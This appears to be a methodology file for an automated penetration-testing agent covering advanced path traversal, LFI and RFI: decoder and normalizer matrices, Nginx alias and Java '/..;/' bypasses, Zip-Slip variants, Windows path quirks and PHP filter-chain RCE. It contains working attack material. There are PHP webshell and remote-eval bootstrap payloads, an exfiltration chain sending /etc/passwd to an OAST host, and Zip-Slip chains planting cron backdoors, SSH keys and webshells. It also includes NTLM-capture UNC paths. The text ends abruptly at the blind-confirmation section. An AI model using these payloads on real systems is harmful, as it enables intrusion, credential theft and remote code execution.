---
name: path-traversal-lfi-rfi-advanced-deep
description: Path traversal / LFI / RFI at advanced+expert depth — proxy-vs-backend decode-vs-normalize matrices, architectural bypass classes (Java `/..;/`, Nginx `alias`), second-order write-then-include, PHP filter-chain LFI→RCE measured, Windows quirks deep, archive-extraction variants, and blind confirmation methodology.
sibling: path_traversal_lfi_rfi
load_when: scan_mode == "deep"
---

# Path Traversal / LFI / RFI — Advanced Depth

This is the advanced+expert deep sibling to `path_traversal_lfi_rfi.md`. The base owns the class framing, sink taxonomy, standard bypass classes, and chaining routes; the novel+frontier sibling `path_traversal_lfi_rfi_novel_deep.md` owns the 2024–2026 CVE frontier and current-frontier framing. This file owns the operational depth in between — parser/proxy/backend differentials, architectural bypass classes, chained-primitive exploitation, and the harder confirmation methodology — routing by filename.

Load this file when the target is beyond a probe hit: the sink is confirmed, the layer chain is fingerprinted, and the goal is either extraction under adverse conditions (WAF/CDN in front, blind, no response reflection, second-order only) or a chain to durable impact through a specific architectural class.

Every version boundary, CVE-detail metadata, and current-frontier claim in this document has been verified against primary sources (NVD, GHSA, vendor advisories, and — for architectural classes — the original disclosure). Measured behavior is marked *(measured on <date>, <stack>)*; asserted or documented behavior is marked as such. If a claim is not measured and not primary-source-anchored, it does not appear.

## Cross-Decoder Decode-vs-Normalize Order

Traversal on the wire and traversal at the file-open call are two different strings, and the mapping between them is the composition of every decoder and every normalizer on the request path. The base file names the class — this section owns the measured behavior for the common combinations and the operational rule the matrix produces.

**Backends measured** (default configurations, no explicit URL-decoding disabled): Python 3.14.6 `parse_qs`/`os.path.join`, Node.js 24.19.0 `req.query`/`path.join`, Go 1.26.5 `URL.Query().Get`/`filepath.Join`, PHP 8.4.24 `$_GET` + string concatenation. Reverse proxy: Nginx 1.30.4 with `proxy_pass` to each backend and, separately, `location` + `alias`. All results captured to `.zen-batch-artifacts/batch-6-*/measurements/url-decoders/`.

**Rule 1 — no measured backend double-decodes the query string.** Every one of `parse_qs`, `req.query`, `URL.Query().Get`, `$_GET` runs exactly one decode pass. A `%252e%252e/` payload lands at the filesystem call with the literal `%2e%2e/` string and fails closed — the file open sees `%2e%2e/` as a filename character sequence and either errors or returns a nonexistent-path response. **Double-decode payloads work only when an upstream layer pre-decodes,** so the payload reaching the backend's own decoder is already `%2e%2e/` (or `../` on a double-decoding upstream). Fingerprint that upstream: it is the surface, not the backend.

**Rule 2 — Nginx `proxy_pass` does not touch the query string** (measured on 1.30.4). The query bytes forward unchanged to the backend. The URL *path* is where the upstream-decode class lives: Nginx's path decoder runs one decode pass and then normalizes the segments (measured — `/a/%2e%2e/%2e%2e/etc/passwd` returns 400, so does `/a/../../etc/passwd`). But `/a/%252e%252e/etc/passwd` forwards with the literal `%2e%2e` in the path segment — a *second* decode in the backend produces `../` and traversal is live. This is the classic Apache-in-front-of-Tomcat double-decode class in a modern shape.

**Rule 3 — an absolute-path query argument replaces the base, but only for the specific stacks.** Measured (matched to the base file's containment table):

| Backend, join call | `?f=../../etc/passwd` (query decoded to `../../etc/passwd`) | `?f=/etc/passwd` (query decoded to absolute) | `?f=%2f..%2fetc/passwd` (query decoded to `/../etc/passwd`) |
|---|---|---|---|
| Python `os.path.join(base, f)` | escapes to `/etc/passwd` | **replaces** → `/etc/passwd` | **replaces** → `/../etc/passwd` → **`/etc/passwd`** — a zero-`../` disclosure with only a leading `%2f` in the query |
| Node `path.join(base, f)` | escapes to `/etc/passwd` | concatenates → `/base/etc/passwd` | concatenates |
| Node `path.resolve(base, f)` | escapes | **replaces** | replaces to `/etc/passwd` |
| Go `filepath.Join(base, f)` | escapes | concatenates → `/base/etc/passwd` | concatenates |
| PHP `"$base/$f"` (string concat) | escapes to `/etc/passwd` after `realpath` | concatenates | concatenates |
| Java `Paths.get(base).resolve(f).normalize()` | escapes | **replaces** | replaces |

The `%2f..%2fetc/passwd` variant is the one to remember: on Python `os.path.join` (Flask, Django `os.path.join` calls, most Python HTTP file-servers), a zero-`../` payload with a leading `%2f` in the query bypasses every filter that looks for the literal `..`. That is the class fingerprint — traversal that looks like an absolute-path override, achieved through the decoder producing an absolute path from a shape the filter didn't inspect.

**Rule 4 — decode-vs-normalize order is the missing hop.** The specific bypass class you get depends on which comes first at each layer:

| Layer sequence | `%2e%2e/` payload lands at file-open as | `%252e%252e/` payload lands as |
|---|---|---|
| Decode then normalize | `../` (traversal live) — normalizer sees `..` and either canonicalizes or rejects, depending on layer | `%2e%2e/` (fails; unless a *second* decode fires downstream) |
| Normalize then decode | `<empty>` (segment stripped as non-canonical) — traversal filtered even before decode | `%252e%252e/` → decode → `%2e%2e/` → normalize → `<empty>` (still filtered) |
| Decode + no normalize | `../` (traversal live) — no normalization ever fires | `%2e%2e/` → next decoder decides |
| Normalize + no decode | `%2e%2e/` (literal; may fail-open at file layer since the segment isn't obviously `..`) | `%252e%252e/` (literal) |

The two failure modes are symmetric: an inspector at layer N normalizes on the pre-decoded string and passes the traversal because `%2e%2e/` isn't `..`, and layer N+1 decodes and traversal is live; or an inspector at layer N decodes and normalizes fully, but layer N+1 re-decodes and traversal is live because the inspector's canonical form was consumed at layer N.

Confirmation methodology for a black-box target: pair each payload variant with an in-root filename control (a legitimate file the endpoint serves) using the *same* encoding shape. If the traversal variant returns the traversal target's bytes and the control variant returns the control file, the layer chain resolves that variant through to the file open. If the control fails on that encoding but succeeds on plain form, the layer chain has a normalization asymmetry — record which shape traverses cleanly.

## Nginx `alias` Off-by-Slash — Measured Reproduction

The class: an `alias` directive whose `location` prefix does not end in `/` allows a request that appends `..` (with no leading `/`) to the location prefix to escape the alias root. This is the Orange Tsai finding — architectural, not CVE-anchored, config-fingerprintable.

**Measured on Nginx 1.30.4** (`.zen-batch-artifacts/batch-6-*/measurements/url-decoders/`):

```nginx
location /static { alias /tmp/urltest_base/; }
```

Request `GET /static../urltest_secret.txt` returns 200 with the content of `/tmp/urltest_secret.txt` (which sits *outside* `/tmp/urltest_base/`). Nginx prefix-matches `/static`, sees no `/` before `..` inside the URI segment, so its normalizer treats `static..` as a filename character sequence rather than a canonical `..` segment, and appends the raw remainder `../urltest_secret.txt` to the alias root — the resolved path is `/tmp/urltest_base/../urltest_secret.txt`, and the OS resolves the `..` at open time.

**Measured constraint (do not overclaim the primitive):** the escape is **single-directory** — a request with two `../` (`GET /static../../urltest_secret.txt` in a two-parent hierarchy) failed to disclose. The primitive lets you break out of the alias root by one level, not to arbitrary filesystem paths. Reach beyond one level requires a symlink from the parent directory or a second stack (a `..` that resolves through an intermediate directory whose write is chained from an upload).

**Fingerprint the config:**
- `curl -I 'https://target/static/../'` returns 400 or the location-index response — expected for a correctly-slashed alias.
- `curl -I 'https://target/static../'` (no slash) returns 404 or the directory listing of the alias parent — the class is live if the response reveals content from outside the alias root, even a directory listing.
- Chained probe: `GET /static../<known-parent-file>` where `<known-parent-file>` is a file you know exists one level up (e.g., a `.gitignore`, `README.md`, or a canonical `/tmp/*` marker in an intentionally-vulnerable test).

**Detection at scale**: grep an Nginx config for `location /X { alias /Y/; }` where `/X` does not end in `/` — the tool `gixy` (`github.com/yandex/gixy`) implements exactly this rule and flags it as `alias_traversal`. When you can read the config, that is the deterministic detection; from the outside, the URI-shape probes above are the only signal.

**Not fixed upstream by design** — this is a documented operator-config pattern, not a code defect in Nginx. The class persists as a live 2026 primitive and will keep persisting.

## Java-Backend Path-Parameter Differential (`/..;/`)

Second architectural class from the same disclosure track. RFC 3986 permits `;name=value` path parameters inside every URI segment; different HTTP layers disagree about whether to strip them, keep them, or truncate at them. When a reverse proxy performs authorization on the pre-strip URI and a Java-backend router receives the post-strip URI, the two see different resource paths and an ACL bypass is available.

**Measured/documented divergences** (documented behavior of the widely-deployed stacks; measure your specific version):

| Layer | Behavior on `/foo;name=orange/bar/` |
|---|---|
| Apache `httpd` (`mod_proxy` / `mod_jk`) | forwards literal — sees `/foo;name=orange/bar/` |
| Nginx (`proxy_pass`) | forwards literal — sees `/foo;name=orange/bar/` |
| IIS | forwards literal — sees `/foo;name=orange/bar/` |
| Tomcat (default connector) | strips path parameters — sees `/foo/bar/` |
| Jetty | strips path parameters — sees `/foo/bar/` |
| WildFly | truncates at `;` — sees `/foo` |
| WebLogic | truncates at `;` — sees `/foo` |

**Primitive:** any authorization decision made on the pre-strip URI at the proxy is bypassable when the backend strips or truncates. The classical shape:

```
GET /public/..;/admin/ HTTP/1.1

# proxy sees /public/..;/admin/ (may match a permit rule on /public/)
# Tomcat sees /public/../admin/ → /admin/ (strips path-parameter, then normalizes)
```

Any URL-based ACL keyed on prefix (`/admin` denied, `/public` allowed) is defeated when the strip layer produces the denied prefix from an allowed one. This includes:

- **mod_jk / AJP forwarding** — Apache `mod_jk` in front of Tomcat; a `/protected/..;/admin/dashboard` request passes an `/protected/*` allow rule at Apache and lands as `/admin/dashboard` in Tomcat.
- **Reverse proxies fronting Spring MVC / Boot** — Spring's URI parser (via Tomcat/Jetty embedded) strips path parameters, so the same class fires against any Spring app behind a proxy that keeps them literal.
- **Management-console reach** — Tomcat Manager, Jenkins CLI-over-HTTP, Confluence admin endpoints, JMX bridges — any admin URL denied at the proxy is reachable through `/allowed/..;/admin/`.

**Fingerprint the divergence:**
```
GET /any-path;/probe HTTP/1.1
```
The response distinguishes: Tomcat/Jetty returns the resource at `/any-path/probe` (or its 404 shape); WildFly/WebLogic returns the resource at `/any-path` (or its 404 shape); a proxy-only layer returns the raw `/any-path;/probe` behavior.

**Encoded-semicolon (`%3b`) variant** — some proxies do not decode `%3b` on the path, but the backend does, so a proxy that would normally see the `;` and evaluate the strip-vs-forward decision receives `%3b` and forwards. Confirm with `curl 'https://target/public/..%3b/admin/'` and inspect the backend behavior; measured behavior differs per proxy configuration.

**Confirmation:** the class is architectural, so the response shape has to distinguish proxy behavior from backend behavior. Chain the probe with a known-authorized path (`/public/status`) and an unauthorized path (`/admin/status`) at the same host:
1. `GET /admin/status` — 403 (proxy denies).
2. `GET /public/status` — 200 (proxy allows).
3. `GET /public/..;/admin/status` — 200 with `/admin/status` content = **class live**; 403 = proxy also strips (or proxy re-canonicalizes and denies); 200 with `/public` content = backend also forwards literal (no divergence).

Legacy CVE-2018-11759 in `mod_jk` documents one Tomcat-JK expression of this class. The class as a whole is architectural, per the disclosure at Black Hat USA 2018 — it persists across specific versions because it lives in the RFC-permitted divergence between path-parameter interpretations.

## Second-Order Traversal — Write-Then-Include

The one-shot primitive: the app stores an attacker-supplied string (filename, path fragment, template name, report identifier) at write time, and a *different* endpoint reads that string at a later time as the source of a file operation. Every mitigation on the write path is defeated because the write layer sanitizes to a policy the read layer doesn't share.

**Common shapes:**
- **Filename → later read** — an upload endpoint accepts any filename (basename-only allowlist) and stores it in the DB; a download/export endpoint later reads by filename and joins against a per-user directory that isn't the upload directory.
- **Template name → later render** — an admin sets a "report template name" that the report engine loads at render time; the write layer allowlists on file extension but the render layer joins against `views/` and follows any `../` inside the stored value.
- **Import descriptor → later import** — a build/CI system stores a "job manifest path" the runner reads later; the runner interprets the manifest path as authoritative and reads from the CI filesystem.
- **Logged path echoed to admin viewer** — a webhook stores its target URL in a log; an internal admin dashboard renders the log as HTML with the URL as a link; a downstream fetcher retrieves it — combined with a `file://` scheme, that is second-order LFI via the log.

**Exploitation path — canary chain:**
1. **Probe the write layer** — determine what shape it accepts. Extension-only checks pass `image.jpg` bytes containing `../` in the filename portion; case-only checks pass `%2e%2e/`; length-only checks pass anything under the limit.
2. **Store a canary path** — a distinctive value (`___zen_${rand}___`) inside a traversal shape (`../../../tmp/___zen_${rand}___`) — the shape lets you distinguish traversal-successful reads from noise.
3. **Trigger every downstream reader** — every endpoint that reads by name — inventory each; the reader that opens `/tmp/___zen_${rand}___` (a marker file you dropped there via a separate primitive, or one that already exists at a known path) confirms the second-order surface.
4. **Chain the exploit** — replace the canary with the actual target (source file, credentials, or a written-then-included PHP file for evaluate-sink chains).

**Confirmation discipline for second-order:**
- **Timing between write and read** matters — a batched read (nightly report, hourly cache invalidation) makes the confirmation delayed; a real-time reader (WebSocket update, immediate render) makes it immediate. Match your test timing to the observed shape.
- **The write may sanitize the *display* representation but not the *stored* one** — the write endpoint may URL-decode the filename for storage and then the storage layer holds the decoded string; the reader sees the decoded string and joins directly. A payload that survives that display-vs-storage decoding is the one to use.
- **Not every stored value is second-order** — the finding is "this stored value reaches a file operation." Grep the code path from storage layer to every possible reader; only the ones that hit a file-open sink are the class.

## Archive Extraction — Zip-Slip and Format Variants

The base introduces Zip-Slip (`../` inside archive entries escapes the extract root). The advanced surface is the collection of format-specific variants and the extraction-engine-specific defenses:

**Format-specific attack shapes:**

- **ZIP** — the canonical Zip-Slip: an entry name containing `../` traverses up from the extract root. Windows extractors that translate `/` to `\` and accept `\` in entry names give you `\..\` for Windows. Absolute paths (`/etc/cron.d/backdoor` as an entry name) are accepted by libraries that don't validate the leading `/`. Symlink entries (ZIP's Unix-mode field marks a symlink) let you drop a symlink first, then a subsequent write follows it — the write lands outside the extract root through the symlink.
- **TAR** — historically the worst offender. TAR entries carry POSIX-style paths, and GNU tar supports "long-name" and "long-link" extensions (`L` and `K` typeflags) that can contain traversal outside the normal path field. Symlink and hardlink entries land in the extract directory; on next-entry write, the extractor follows the symlink and writes wherever it points. `--absolute-names` on GNU tar lets absolute paths through. The `tarfile` module in Python 3.11 and earlier extracted symlinks/hardlinks by default — Python 3.12+ added `filter='data'` opt-in, and 3.14 makes it the default; older Python code paths remain exposed.
- **TAR.GZ / TAR.BZ2 / TAR.XZ** — same TAR content over a compressed wrapper; the compression is opaque to the traversal.
- **7Z** — supports symlinks and hardlinks; the 7z format's Unix extension carries the same symlink primitives as TAR. Some 7z libraries also accept absolute paths.
- **RAR** — historically supported symlinks and had CVE-2018-20250 (RAR ACE-format historical baggage). More recently, CVE-2025-6218 (see novel sibling) reintroduces path-traversal via archive-embedded paths in RARLAB WinRAR itself.
- **CPIO / AR** — POSIX archive formats with similar path semantics; less commonly exposed in web-app extract paths but present in Docker image import flows and RPM/DEB tooling.
- **ISO / squashfs / dmg** — mountable formats; extraction tools that copy contents to a filesystem inherit the containment discipline of the tool, not of the format.
- **OOXML (docx/xlsx/pptx)** — ZIP wrappers around XML. A Zip-Slip inside an OOXML extractor lands wherever the ZIP layer resolves the entry; because OOXML consumers often extract to a temp directory and then read specific relative paths, the Zip-Slip target is often less useful — the extracted files that aren't the expected `word/document.xml`, `xl/workbook.xml`, etc., are ignored by the consumer.

**Extraction-engine defenses (what actually contains):**

The only correct defense is to canonicalize the *joined* path (extract-root + entry-name), then verify the canonical result starts with the canonical extract-root plus a separator. Every other pattern has known bypasses:

- **String-prefix check on the raw entry** — bypassed by `../..\.. -> normalizer collapses differently across the check.
- **Reject entries containing `../`** — bypassed by encoded forms (`%2e%2e/`), by `..%00/` in older stacks, and by symlink-then-write (the entry itself does not contain `../` — a symlink resolves it at write time).
- **Chroot the extraction** — actually contains, but requires kernel privileges and is rarely deployed.
- **Symlink policy** — must be "reject" or "resolve-and-verify-inside-root"; must be applied *before* the write, not after.

**Chain expressions:**
- **Zip-Slip → template/plugin webshell** — drop `../../var/www/html/wp-content/plugins/x/x.php` inside an uploaded ZIP; the WordPress plugin scanner picks it up on next request.
- **Zip-Slip → cron / systemd unit** — write `../../etc/cron.d/backdoor` from an upload processed by a root-owned extractor; the cron fires under root.
- **Zip-Slip → SSH authorized_keys** — write `../../root/.ssh/authorized_keys` when the extraction runs as root; direct SSH access follows.
- **Zip-Slip → CI runner poisoning** — write into a CI runner's cached workspace; next pipeline run uses the poisoned files as inputs.

**Extraction library defaults by language:**

- **Python `zipfile.ZipFile.extractall(path)`** — historically vulnerable; Python 2.7.4 added path-normalization to prevent traversal, but `extract()` on individual entries was slower to be patched. Modern Python (3.12+) mostly contains, but symlink entries are handled per-platform.
- **Python `tarfile.open(...).extractall(path)`** — the class-defining vulnerable pattern for years. Python 3.12 introduced `filter='data'` (safe) / `filter='tar'` (moderate) / `filter='fully_trusted'` (vulnerable-permissive). Python 3.14 makes `filter='data'` the default when no filter is specified — but any code explicitly passing `filter='fully_trusted'` (or older code unchanged) remains vulnerable. PEP 706 documents the filter semantics.
- **Java `java.util.zip.ZipFile` / `ZipInputStream`** — no automatic path containment; callers must validate each entry name. Zip-Slip PoCs against Java are common in bug bounties.
- **Java Apache Commons Compress** — same story; the library provides `ZipArchiveEntry.getName()` but does not validate the name against a base directory. Callers must implement the check.
- **Node.js `unzipper`** — historical CVEs on Zip-Slip; modern versions (>=0.10.x) added path containment.
- **Node.js `yauzl`** — no built-in containment; documentation warns callers explicitly.
- **Node.js `adm-zip`** — historically vulnerable; a `path.join` on unsanitized entry names.
- **Go `archive/zip` and `archive/tar`** — no containment; standard library docs warn callers.
- **PHP `ZipArchive::extractTo($path)`** — no containment historically; PHP 5.6+ added some checks but symlink entries and specific path shapes have bypassed them across versions.
- **.NET `ZipFile.ExtractToDirectory(archive, path)`** — .NET Framework 4.5 introduced path containment; .NET Core versions have varied. `ZipArchiveEntry.FullName` requires the caller to check.
- **Ruby `Zip::File.open` (rubyzip gem)** — historical CVEs; modern versions require `Zip::File.open(path).each { |entry| entry.extract }` with the caller checking `entry.name`.

The extraction-library-specific behavior matters because the same archive containing `../../shell.php` may fail cleanly on one language, succeed on another, and land partially on a third. Fingerprint the extractor before crafting the exploit archive.

## Windows Path Handling — Deep

The base covers ADS (`::$DATA`), 8.3 short names, trailing dot/space, and UNC. The advanced surface layers depth onto each.

**Alternate Data Streams — beyond `::$DATA`:**
- Every NTFS file supports named streams: `file.txt:stream_name:$DATA` (a stream named `stream_name`) and `file.txt:` (a stream with no name — same as `::$DATA`). Uploading to `file.txt:hidden` writes into a named stream that most enumeration tools miss.
- Streams on *directories* — `dir:hidden:$DATA` is a valid stream on a directory. Extraction tools that check whether the target is a file or directory may pass a stream write on a directory through.
- `::$INDEX_ALLOCATION` on a filename forces resolution as a directory; `file.txt::$INDEX_ALLOCATION` creates directory-shape access on what looks like a file.
- The Win32 API's `CreateFile` with `FILE_FLAG_BACKUP_SEMANTICS` opens streams that regular `CreateFile` cannot; a security tool that scans "files" and misses streams is a false-negative surface.

**8.3 short-name enumeration primitive:**
- Legacy short-name generation is on by default on many Windows installs (`fsutil 8dot3name query` reveals). When on, every long filename gets a short name (`~1`, `~2`, `~3`, ...) that resolves the same file.
- An enumeration primitive: request `web~1.con`, `web~2.con`, ... — the ones that succeed disclose whether files matching the pattern exist. Combined with a directory-listing block, this recovers filenames the app tried to hide.
- Bypass extension allowlists: `secret.php` becomes `SECRET~1.PHP` — but the short name normalizes to the long name, so any handler keyed on `.php` still routes correctly. The bypass is that a check keyed on the exact string `secret.php` (blacklist or allowlist) misses `SECRET~1.PHP`.

**Junction points, hard links, symlinks:**
- **Junction points** (directory-only reparse points): created with `mklink /J`, resolvable by any Win32 file operation. A junction from `C:\uploads\safe` to `C:\Windows\System32` lets any read of `C:\uploads\safe\...` reach `C:\Windows\System32\...` without traversal characters — the traversal is *in the filesystem*, not the URL.
- **Hard links**: `mklink /H` creates another directory entry pointing at the same inode. When the app checks a security property on one name, the same content is accessible under a different name.
- **Symbolic links** (file symlinks + directory symlinks): `mklink` / `mklink /D`; require SeCreateSymbolicLinkPrivilege (default: administrators only, or the Developer Mode flag on Windows 10+). When present, follow full traversal semantics.
- Advanced primitive: an upload writes a symlink (the ZIP `NTFS_REPARSE_POINT` extension or a TAR entry with symlink type) inside the uploads directory; a subsequent read follows the symlink to a target outside the uploads root. The traversal is entirely in the filesystem — the URL never contains `..`.

**UNC paths and NT namespace:**
- `\\attacker\share\file.txt` — a UNC path opened by a Win32 file call issues an outbound SMB connection to `attacker`, sending NTLM authentication material during the initial protocol negotiation. That is NetNTLMv1/v2 capture (route to `authentication_ntlm` or a captor like `Responder`). It is also SSRF-like — the app makes an outbound connection you can direct.
- `\\?\C:\...` — verbatim path prefix; disables Win32 path normalization. A path like `\\?\C:\foo\..\bar` does *not* resolve `..` — verbatim paths are handed to the kernel as-is. Useful defensively (opens a path the caller controls exactly), but also useful offensively when a security check normalizes and a subsequent open bypasses the check by prefixing `\\?\`.
- `\\?\GLOBALROOT\Device\HarddiskVolume1\...` — direct NT namespace access; bypasses drive-letter mapping entirely. Rarely reachable from web apps but common in Windows-service exploitation.
- `\\.\...` — DOS device namespace; `\\.\C:\...` and `\\.\PhysicalDrive0` are raw-device access; `\\.\pipe\...` reaches named pipes. A file API that opens `\\.\pipe\<name>` on user input connects to a named pipe — pipe impersonation surfaces if the pipe server calls `ImpersonateNamedPipeClient`.

**Reserved device names, deeper:**
- `CON`, `PRN`, `AUX`, `NUL`, `COM1`-`COM9`, `LPT1`-`LPT9` are devices at *any depth*: `C:\foo\bar\CON.txt` opens the console. On a handler that opens files by path, requesting `CON.txt` at any URL depth may hang or return device data instead of the intended file.
- `CONIN$` / `CONOUT$` / `CONERR$` — some processes; niche.
- Windows 11 24H2 relaxed some of these behaviors; measure per Windows build if the target is modern Windows Server.

**Mixed separators and encoding:**
- Windows accepts `/` and `\` interchangeably in most file APIs. A URL-side filter that only checks `\` misses `/`; one that checks `/` misses `\`.
- URL-encoded separators: `%5c` (backslash), `%2f` (slash), `%c0%af` (invalid UTF-8 that some decoders map to `/`), `%c0%2e` (invalid UTF-8 for dot). Fingerprint the decoder before trusting an encoding-based bypass.

**WSL and Windows-container boundary crossings:**
- **WSL2 file share** — `\\wsl.localhost\<distro>\...` and `\\wsl$\<distro>\...` (deprecated) reach the WSL Linux filesystem from Windows. A Windows service that opens `\\wsl.localhost\Ubuntu\etc\passwd` reads the Linux passwd file inside the WSL VM — cross-boundary read.
- **Windows containers** — process-isolated containers share the kernel; a container that opens `\\?\GLOBALROOT\Device\HarddiskVolume*\...` may reach the host filesystem depending on isolation mode. Hyper-V-isolated containers block this.
- **Docker for Windows (LCOW / Moby)** — bind mounts translate host paths to container paths; a container process that opens `/mnt/c/Windows/...` reaches the host `C:\Windows\...` when the mount is present.
- **`.NET` on Windows containers** — `Environment.SpecialFolder` and `Path.GetTempPath()` resolve to container paths (usually `C:\Windows\Temp` inside the container), not host paths — but bind-mounted volumes appear at their mount points.

**Long-path support and MAX_PATH:**
- Windows historically limited paths to 260 characters (`MAX_PATH`). Windows 10 1607+ supports long paths (up to ~32,767 characters) via `LongPathsEnabled` registry setting or per-manifest opt-in.
- On systems where long-path support is off, a path longer than 260 characters silently truncates in some APIs — traversal that relies on a specific full path may land at a truncated prefix and open a different file.
- `\\?\` prefix bypasses `MAX_PATH` regardless of the registry setting — a long-path payload prefixed with `\\?\` opens the intended file even on legacy systems.

**Drive-letter tricks and current-directory manipulation:**
- **Current directory per drive** — on Windows, each drive has its own "current directory." `cmd.exe`'s `chdir /D C:\foo` sets the current directory for C: to `C:\foo`. Then `type C:file.txt` (note: no path separator) opens `C:\foo\file.txt`. A Web-app process that inherits current directories from a launching shell can be manipulated if the current-dir is influenced.
- **Drive-relative paths** — `file.txt` (relative) resolves against the current directory of whatever drive is implied by the invocation. `C:file.txt` resolves against the C: current directory. `\file.txt` resolves against the current drive's root. These are the same class as absolute-vs-relative but with an extra dimension.

**Windows `Device` namespace and NT paths beyond `\\?\`:**
- `\\.\PhysicalDrive0` — raw disk access; a file API that opens this reads sector 0 (the MBR). Requires appropriate privileges.
- `\\.\GLOBALROOT\Device\HarddiskVolume1\...` — same as `\\?\GLOBALROOT\...`; direct NT namespace.
- `\\.\Volume{GUID}\...` — mount-point-independent volume access.
- These are extremely rare in web-app exploitation but can appear in Windows-service exploitation and desktop-app pen tests.

## PHP Filter-Chain LFI→RCE — Deep

The base introduces the class (Synacktiv's `php_filter_chain_generator`), the include-vs-read sink distinction, and the payload shape. The advanced surface is the operational reality — where the chain succeeds, where it silently breaks, and how to size the request for a real target.

**Chain-length scaling (measured against Synacktiv generator commit `ce3cc76`, PHP 8.4.24 / libxml 2.15.3 / glibc iconv 2.42):**

| Payload bytes | Chain bytes |
|---|---|
| 27 (`<?php system($_GET["c"]);?>`) | 5,425 |
| 48 (marker `<?php echo "MEASURED_RCE_MARKER_".md5("test");?>`) | 9,469 |
| 80 (dual `eval`+`system`) | 16,354 |

The chain scales ~200× the payload length. Two operational consequences:

- **URL-length limits become a fingerprintable gate above ~8 KB.** Nginx `large_client_header_buffers` defaults limit URI to 8 KB; a bare Apache defaults to 8 KB; Cloudflare's URI limit is 32 KB; WAF products cap variably. Above the target's URL limit, the chain 414s or is truncated and fails silently. Fingerprint by sending a nonsense URL of the intended chain length before the real chain; if it 414s, you cannot deliver a longer payload through GET. POST-body delivery via a sink that accepts POST body content circumvents this — but that requires a sink shape that reads the POST body as the wrapper input.
- **The chain length is the operational cost of the wrapper output.** For very short payloads (an OAST beacon `<?=file_get_contents('http://...');?>`) the chain is under 5 KB and passes. For payloads that load a larger PHP file from a URL, the loader stage is short (`<?php eval(file_get_contents('http://.../s.php'));?>` is ~40 bytes) and the chain fits — bootstrap-then-load is the pattern for delivering large payloads.

**Include-vs-readfile sink discipline (measured — matches base file claim):**
- `include($_GET['file'])` sink executed the marker chain: response body contained `MEASURED_RCE_MARKER_098f6bcd4621d373cade4e832627b4f6`.
- `readfile($_GET['file'])` sink returned the raw wrapper bytes with **no marker** — execution requires an evaluating sink. `file_get_contents` behaves identically to `readfile` for this purpose.
- `require`, `require_once`, `include_once`, `eval(file_get_contents(...))` all evaluate — all vulnerable if they accept the `php://` scheme.

**Hard boundary is host libc iconv, not PHP version.** Measured chain executed cleanly on PHP 8.4.24 despite 8.4's deprecation of several legacy iconv charsets (deprecations surface as warnings, not fatals; execution proceeds). The chain depends on the specific source–target charset transitions the Synacktiv generator emits. On a stripped-iconv build (Alpine musl minimal, some minimal Docker Bitnami images, embedded Linux), specific transitions can be missing — the chain then either silently truncates output or errors. Environment fingerprint: check `php -m | grep iconv`, `iconv -l | wc -l` — a stripped `iconv -l` list is the ceiling.

**PHP scheme prerequisites (all-of-N):**
- The sink is an evaluating context (`include`/`require`/`eval` on the wrapper output).
- The sink accepts the `php://` scheme — `allow_url_fopen=On` is enabled (default `On` in PHP; `Off` breaks all `php://`, `http://`, `ftp://` in-app).
- For the `php://` scheme specifically, `allow_url_include=On` is *not* strictly required — `php://filter` is a filter over an inline resource (`php://temp`, `php://memory`, or `php://input`) and PHP treats these as local for `include`. Some hardening guides claim otherwise; measured behavior on PHP 8.4 is that `include('php://filter/...=resource=php://temp')` evaluates without `allow_url_include`.
- The host's iconv library provides the charset transitions the generator's chain uses.

**Confirmation methodology:**
1. Confirm the sink evaluates: send a *short* chain (`<?php echo "MARKER_ZEN";?>` — 24 bytes payload, ~4.8 KB chain) and grep the response for `MARKER_ZEN`. Do not test with `system` first — a `system('id')` result may be filtered from responses by a WAF post-processor. A plain echo is the cleanest oracle.
2. If the short chain returns the wrapper bytes literally, the sink is *not* evaluating — reclassify as read-only disclosure and stop the RCE claim.
3. If the short chain returns the marker, escalate cautiously — use short bootstrap payloads that load the real payload from an OAST-controlled URL.
4. Report chain length delivered, URL length limit fingerprinted, and the exact scheme used.

**Chain generation quirks:**
- The generator's output is non-deterministic across runs — the specific iconv transitions may differ; different generations of the same payload produce equivalent-behavior chains of similar length.
- Newer PHP builds may add or remove iconv aliases — a chain generated on one host may not work on another. Regenerate on a host matching the target's `phpinfo()` iconv library version when accessible.
- The generator does not encode/base64 the payload — the payload appears as PHP source in the chain-decoded output. A WAF that scans decoded content will match on `<?php` — some derivations use `<?=` short-open-tag which requires `short_open_tag=On`.

**Bootstrap-then-load pattern** — the canonical technique for delivering payloads larger than the URL-length ceiling:

1. Short bootstrap payload (30–60 bytes) as the filter-chain input:
   ```php
   <?php eval(file_get_contents('http://<oast>.oast.fun/s.php'));?>
   ```
   Chain length: ~6–10 KB (fits in every default URL buffer).
2. Serve the real payload as `s.php` from an OAST-controlled server; content is unrestricted.
3. Fire the chain; PHP evaluates the bootstrap, which fetches `s.php` and evaluates it.
4. Confirmation: an inbound HTTP hit at the OAST server for `/s.php`, followed by the intended payload's behavior (an outbound beacon from the second-stage, or a reflected response on the primary channel).

The bootstrap-then-load pattern is what makes the class practical against real targets — a raw `<?php system($_GET['c']);?>` chain is ~5.4 KB and works under most defaults, but scaling to any nontrivial payload requires the two-stage delivery.

**OAST-callback confirmation shape** — when the sink returns no bytes at all (a completely blind LFI-evaluate), use an OAST-only chain:
```php
<?php file_get_contents('http://<oast>.oast.fun/x?u='.urlencode(file_get_contents('/etc/passwd')));?>
```
Chain length: ~10 KB (fits). Confirmation is the OAST HTTP hit with URL-encoded file contents. This pattern *is* execution — the OAST fetch happens on the target, proving eval. Without OAST, a completely blind chain cannot be confirmed as execution vs disclosure.

**WAF signatures the class evades and the ones that catch it:**
- Catches: signatures that decode the wrapper output and match on `<?php` or `<?=`. Some cloud WAFs decode `php://filter` chains at inspection time.
- Evades: signatures keyed on `../` or filesystem path shapes — the payload never contains those.
- Evades: signatures keyed on payload keywords (`system`, `exec`, `passwd`) — the payload keywords land inside the chain's encoded output and are not visible before decode.
- Evades: signatures on request size unless the chain length exceeds the block threshold (typically 32 KB+).

**Version-boundary risk** — the class was introduced in PHP 5.0 (`php://filter` scheme) and remains present through PHP 8.4. Individual charset transitions have been deprecated in later PHP versions but the class is not gated by a PHP version. When PHP eventually removes the `convert.iconv.*` filter (candidate for a future major), the class dies with it — until then, treat as an ambient primitive against any include-sink accepting `php://`.

## Blind Confirmation Methodology

When the response never reflects the file bytes — the endpoint always returns `200 OK` with the same body, or a fixed error page, or a JSON envelope that never carries file content — you need an oracle that distinguishes "read succeeded" from "read failed" without visible content.

